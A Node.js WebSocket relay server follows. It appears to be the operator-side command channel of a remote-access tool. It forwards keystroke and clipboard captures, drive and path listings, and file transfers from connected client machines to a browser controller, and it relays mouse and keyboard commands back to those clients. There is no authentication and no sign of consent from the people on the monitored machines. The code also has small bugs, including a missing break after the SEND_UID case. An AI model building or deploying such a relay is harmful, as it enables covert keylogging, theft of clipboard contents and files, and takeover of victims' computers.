const PING = 99;
const BROWSER_CONNECTED = 100;
const SEND_UID = 101;
const QT_CONNECTED = 102;
const LOOK_UID = 103;
const UN_LOOK_UID = 104;
const CAP_UID = 105;
const UN_CAP_UID = 106;
const CAP_CLIP = 107;
const CAP_KEY = 108;
const UIDList = 109;
const READ_DRIVES = 110;
const READ_PATH = 111;
const REQUEST_DRIVES = 112;
const REQUEST_PATH = 113;
const UFD = 114;
const RUFD = 115;
const MCLICK = 116;
const MDCLICK = 117;
const CVSTR = 118;
const KEYDNE = 119;
const STOPALL = 120;
const STOPUP = 121;
const DELC = 122;
const MRCLICK = 123;
const RE_LOOK_UID = 124;
const MDOWN = 125;
const MUP = 126;
const PDT = 127;
const RPDT = 128;
const DMM = 129;
const DDMM = 130;
const IMM = 131;
const SCR = 132;
const WAKEUP = 133;
const REQUEST_SPATH = 134;

const http = require('http');
const WebSocket = require("ws");

// Create a WebSocket server
const wss = new WebSocket.Server({ noServer: true });

let browserClient = null;
let qtClientWs = null;
const qtClients = new Map(); // Store QT clients with their IDs

// Listen for connection events
wss.on("connection", (ws, req) => {
  console.log("A new client connected.");
  const ip1 = req.socket.remoteAddress;

  console.log(`New connection from IP: ${ip1}`);
  ws.on("message", (message) => {
    try {
      // Try to convert the buffer to a string
      const messageString = message.toString("utf8");
      // Check if it looks like JSON (starts with "{" or "[")
      if (!(messageString.startsWith("{") || messageString.startsWith("["))) {
      } else {
        const msg = message.toString();
        const jsonData = JSON.parse(msg);
        switch (jsonData.e) {
          case QT_CONNECTED:
            // Assume this is a QT client sending its unique ID
            const entry1 = [...qtClients.entries()].find(
              ([_, id]) => id === ip1
            );
            qtClientWs1 = entry1 ? entry1[0] : undefined;
            if(!!qtClientWs1) {
              qtClients.delete(qtClientWs1);
            } 
            
            const clientId = ip1;
            qtClients.set(ws, clientId);
            console.log(`QT client registered with ID: ${ip1}`);
            sendClientList(); // Send the updated list of client IDs
            break;
          case BROWSER_CONNECTED:
            browserClient = ws;
            console.log("Browser client registered.");
            sendClientList(); // Send the list of client IDs when the browser client connects
            break;
          case PING:
            break;
          case SEND_UID:
            const jsonDataText24 = JSON.stringify(jsonData);
            if (!!browserClient) browserClient.send(jsonDataText24);
          case RE_LOOK_UID:
            const jsonDataText_4 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText_4);
            break;
          case CAP_UID:
            const jsonDataStr = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataStr);
            console.log(`Sent "Cap" message to client with ID: ${ip1}`);
            break;
          case UN_CAP_UID:
            const jsonDataText0 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText0);
            break;
          case STOPUP:
            const jsonDataText_1 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText_1);
            break;
          case DELC:
            const jsonDataText_2 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText_2);
            break;
          case CAP_KEY:
            const jsonDataText = JSON.stringify(jsonData);
            if (!!browserClient) browserClient.send(jsonDataText);
            break;
          case CAP_CLIP:
            const jsonDataText1 = JSON.stringify(jsonData);
            if (!!browserClient) browserClient.send(jsonDataText1);
            break;
          case REQUEST_DRIVES:
            
            const entry2 = [...qtClients.entries()].find(
              ([_, id]) => id === ip1
            );
            qtClientWs = entry2 ? entry2[0] : undefined;
            // if (qtClientWs && qtClientWs.readyState === WebSocket.OPEN) {
            //   const jsonData1 = {
            //     e: READ_DRIVES,
            //   };
            //   const jsonDataText2 = JSON.stringify(jsonData1);
            //   if (!!qtClientWs) qtClientWs.send(jsonDataText2);
            // }
            break;
          case REQUEST_SPATH:
            const jsonData5 = {
              e: READ_PATH,
              v: jsonData.v,
            };
            const jsonDataText_8 = JSON.stringify(jsonData5);
            if (!!qtClientWs) qtClientWs.send(jsonDataText_8);
            break;
          case READ_DRIVES:
            const jsonDataText3 = JSON.stringify(jsonData);
            if (!!browserClient) browserClient.send(jsonDataText3);
            break;
          case REQUEST_PATH:
            const jsonData4 = {
              e: READ_PATH,
              v: jsonData.v,
            };
            const jsonDataText4 = JSON.stringify(jsonData4);
            if (!!qtClientWs) qtClientWs.send(jsonDataText4);
            break;
          case READ_PATH:
            const jsonDataText5 = JSON.stringify(jsonData);
            if (!!browserClient) browserClient.send(jsonDataText5);
            break;
          case RUFD:
            const jsonData6 = {
              e: UFD,
              v: jsonData.v,
            };
            const jsonDataText6 = JSON.stringify(jsonData6);
            if (!!qtClientWs) qtClientWs.send(jsonDataText6);
            break;
          case RPDT:
            const jsonDataText_7 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText_7);
            break;
          case UFD:
            console.log(jsonData);
            const jsonDataText7 = JSON.stringify(jsonData);
            if (!!browserClient) browserClient.send(jsonDataText7);

            break;
          case MDOWN:
            const jsonDataText_5 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText_5);
            break;
          case MUP:
            const jsonDataText_6 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText_6);
            break;
          case MCLICK:
            const jsonDataText8 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText8);
            break;
          case MDCLICK:
            const jsonDataText9 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText9);
            break;
          case CVSTR:
            const jsonDataText10 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText10);
            break;
          case KEYDNE:
            const jsonDataText11 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText11);
            break;
          case MRCLICK:
            const jsonDataText12 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText12);
            break;
          case DMM:
            const jsonDataText13 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText13);
            break;
          case DDMM:
            const jsonDataText14 = JSON.stringify(jsonData);
            if (!!browserClient) browserClient.send(jsonDataText14);
            break;
          case IMM:
            const jsonDataText15 = JSON.stringify(jsonData);
            if (!!qtClientWs) qtClientWs.send(jsonDataText15);
            break;
          default:
            break;
        }
        // Process the JSON data
      }
    } catch (err) {
      console.error("Failed to read message:", err);
    }
    //------------------------------------------------
  });

  ws.on("close", () => {
    
    if (ws === browserClient) {
      console.log("Browser disconnected.");
      browserClient = null;
      const jsonData = {
        e: STOPALL,
      };
      const jsonDataText = JSON.stringify(jsonData);
      if (!!qtClientWs) qtClientWs.send(jsonDataText);
      qtClientWs = null;
    } else if (qtClients.has(ws)) {
      console.log("Client disconnected.");
      qtClients.delete(ws); // Remove the QT client from the map
      sendClientList(); // Send the updated list of client IDs
    }
  });
});

// Function to send the list of QT client IDs to the browser client
function sendClientList() {
  if (browserClient && browserClient.readyState === WebSocket.OPEN) {
    const clientIds = Array.from(qtClients.values());

    // Create a JSON object
    const jsonObject = {
      e: UIDList,
      v: clientIds,
    };
    const jsonData = JSON.stringify(jsonObject);
    if (!!browserClient) browserClient.send(jsonData);
  }
}


// Function to get the real IP address
function getRealIp(req) {
  // If there's an 'X-Forwarded-For' header, take the first IP in the list (real client IP)
  const forwardedIps = req.headers['x-forwarded-for'];
  if (forwardedIps) {
    return forwardedIps.split(',')[0].trim(); // Return the first IP in the list
  }
  
  // Fallback to direct connection IP address
  return req.connection.remoteAddress || req.socket.remoteAddress || req.connection.socket.remoteAddress;
}

// Set up HTTP server to handle incoming HTTP requests
const server = http.createServer((req, res) => {
  const clientIp = getRealIp(req); // Get the real client IP
  console.log('Real client IP:', clientIp); // Log the real IP to the console
  
  if (req.method === 'GET' && req.url === '/k') {
    const entry1 = [...qtClients.entries()].find(
      ([_, id]) => id === clientIp
    );
    qtClientWs1 = entry1 ? entry1[0] : undefined;
    // Example: Sending message to the first connected WebSocket client
    if (qtClientWs1 && qtClientWs1.readyState === WebSocket.OPEN) {
              // Create a JSON object
              const jsonObject = {
                e: SEND_UID,
                v: 
                String.fromCharCode(97 + Math.floor(Math.random() * 26)) + // Lowercase letter
                Math.floor(Math.random() * 10) + // Digit
                String.fromCharCode(65 + Math.floor(Math.random() * 26)) + // Uppercase letter
                Math.floor(Math.random() * 10) + // Digit
                Math.floor(Math.random() * 10) + // Digit
                String.fromCharCode(65 + Math.floor(Math.random() * 26)) // Uppercase letter
              };
              const jsonData = JSON.stringify(jsonObject);
              if (!!qtClientWs1) qtClientWs1.send(jsonData);
              console.log(
                `Sent "Look" message to client with ID: ${clientIp}`
              );
      } else {
      res.writeHead(404, { 'Content-Type': 'text/plain' });
      res.end('No WebSocket clients connected');
    }
  } else {
    res.writeHead(404, { 'Content-Type': 'text/plain' });
    res.end('Not Found');
  }
});

// Upgrade HTTP server to WebSocket server
server.on('upgrade', (request, socket, head) => {
  wss.handleUpgrade(request, socket, head, (ws) => {
    wss.emit('connection', ws, request);
  });
});

// Start the HTTP and WebSocket server
server.listen(8080, () => {
  console.log('Server is running on http://localhost:8080');
});

